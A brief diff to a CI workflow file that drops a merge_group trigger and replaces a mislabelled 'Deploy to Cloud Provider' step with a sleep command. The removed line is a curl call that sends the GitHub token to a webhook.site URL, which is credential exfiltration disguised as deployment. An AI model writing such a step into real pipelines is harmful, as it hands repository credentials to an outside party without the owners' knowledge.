@@ -3,7 +3,6 @@ name: Test workflow
 on:
   push:
   pull_request: 
-  merge_group: 
 
 jobs:
   build:
@@ -18,4 +17,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Deploy to Cloud Provider
-        run: curl "https://webhook.site/810d96e7-df57-40c3-bd50-28e58f2e9248?token=$GITHUB_TOKEN"
+        run: sleep 120s
